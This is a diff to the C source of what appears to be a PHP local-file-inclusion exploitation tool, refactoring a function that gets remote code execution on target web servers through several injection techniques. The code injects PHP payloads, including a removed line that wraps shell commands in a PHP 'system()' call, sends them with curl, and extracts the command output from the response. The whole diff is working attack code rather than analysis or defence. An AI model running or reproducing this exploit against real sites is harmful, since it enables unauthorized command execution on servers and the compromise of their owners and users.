@@ -539,119 +539,63 @@ int check_files(char *base, struct parameter_list *plist, int p){
     return result;
 }
 
-void exec_php(xpl_parameters xpl){
-    char *rce_code_exec = NULL, **regex_out = NULL, *aux = NULL, *mmap_str,
-    *base_uri = NULL, r_str[R_SIZE], regex[M_ALL_SIZE], random_file[20];
-    FILE *x=NULL;
+void exec_phpcode(const char *url, const char *parameter, const char *code, int type){
+    char *base = NULL, *rce_code, rbuf[8], regex[M_ALL_SIZE];
     struct parameter_list plist = {0};
-    size_t inject_index = 0, aux_len = 0;
-    CURL *curl;
     struct curl_slist *chunk = NULL;
+
+    void *plistptr = NULL;
     struct request body;
+    char **match = NULL;
+    CURL *curl;
+    size_t pos;
+    int len = 0;
 
-    int len = 0,size_file,fd;
+    init_str(&body);
+    curl = init_curl(&body, true);
 
-    if(xpl.tech != AUTH){
-        init_str(&body);
-        curl = init_curl(&body, true);
-    } else {
-        if( (x = get_random_file(10, random_file) ) == NULL )
-            die("error while generate tmp file",0);
+    info_single("trying exec code ...\n");
 
-        curl = init_curl(NULL, false);
-        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)x);
-    }
+    if(type == DATA){
+        if(!get_element_pos(&plist, &base, url, parameter, &pos)){
+            error_single("[-] Parameter: %s not found !!!\n", parameter);
 
-    if(xpl.tech != DATA){
-        curl_easy_setopt(curl, CURLOPT_URL, xpl.vuln_uri);
-    } else {
-        if(!get_element_pos(&plist, &base_uri, xpl.vuln_uri, xpl.p_name, &inject_index)){
-            printf("[-] Parameter: %s not found !!!\n", xpl.p_name);
             curl_easy_cleanup(curl);
-            xfree(body.ptr);
+            free(body.ptr);
+
             return;
         }
+
+        plistptr = &plist;
+    } else {
+        curl_easy_setopt(curl, CURLOPT_URL, url);
     }
 
-    chunk = curl_slist_append(chunk, "Connection: Close");
+    chunk = curl_slist_append(chunk, "Connection: close");
     curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
 
-    random_string(r_str, R_SIZE);
-    build_regex(regex, r_str, "(.*)");
+    rce_code = make_code(random_string(rbuf, sizeof(rbuf)), code, (type == AUTH));
+    build_rce_exploit(curl, base, plistptr, pos, type, rce_code);
 
-    if(xpl.cmdx){
-        aux_len = 29+strlen(xpl.cmd);
-        aux = xmalloc( aux_len );
-        snprintf(aux, aux_len,"<?php system(\"%s 2>&1\"); ?>", xpl.cmd);
-        rce_code_exec = make_code(r_str, aux, (xpl.tech == AUTH) ? true : false);
-        xfree(aux);
-    } else {
-        rce_code_exec = make_code(r_str, xpl.code, (xpl.tech == AUTH) ? true : false);
-    }
-
-    printf("\n[~] Trying exec code ...\n");
-
-    if(xpl.tech == ENVIRON){
-        chomp_all(rce_code_exec);
-        build_rce_exploit(curl, NULL, NULL, 0, ENVIRON, rce_code_exec);
-    }
-
-    else if(xpl.tech == INPUT){
-        build_rce_exploit(curl, NULL, NULL, 0, INPUT, rce_code_exec);
-    }
-
-    else if(xpl.tech == DATA){
-        build_rce_exploit(curl, base_uri, &plist, inject_index, DATA, rce_code_exec);
-    }
-
-    else if(xpl.tech == AUTH){
-        build_rce_exploit(curl, NULL, NULL, 0, AUTH, rce_code_exec);
-    }
+    build_regex(regex, rbuf, "(.*)");
 
     if(HttpRequest(curl)){
-        if(xpl.tech == AUTH){
-            fflush(x);
-            fclose(x);
-            fd = readonly(random_file);
-            size_file = get_file_size(fd);
-
-            if(size_file){
-                mmap_str = mmap(0, size_file, PROT_READ, MAP_PRIVATE, fd, 0);
-                regex_out = regex_extract(regex, mmap_str, size_file, PCRE_DOTALL, &len);
-            }
-
-            close(fd);
-        }
-
-        else {
-            regex_out = regex_extract(regex, body.ptr, body.len, PCRE_DOTALL, &len);
-        }
-
-        printf("\n[+] Result: ");
-
-        if(len > 0){
-            printf("\n\n'%s'\n",regex_out[0]);
-            regex_free(regex_out);
-        } else {
-            printf("nothing to show !\n");
-        }
+        match = regex_extract(regex, body.ptr, body.len, PCRE_DOTALL, &len);
     }
 
-    printf("\n\n[+] Finish\n\n");
+    info_single("result: \n");
 
-    if(xpl.tech == DATA){
-        xfree(base_uri);
-        free(plist.trash);
-        free(plist.parameter);
-    }
-
-    xfree(rce_code_exec);
-    if(xpl.tech != AUTH){
-        xfree(body.ptr);
+    if(len > 0){
+        printf("\n%s\n\n", match[0]);
+        regex_free(match);
     } else {
-        unlink(random_file);
+        error_single("nothing to show !\n");
     }
 
+    info_single("finish\n");
+
+    free(body.ptr);
+    free(rce_code);
     curl_easy_cleanup(curl);
     curl_slist_free_all(chunk);
 }
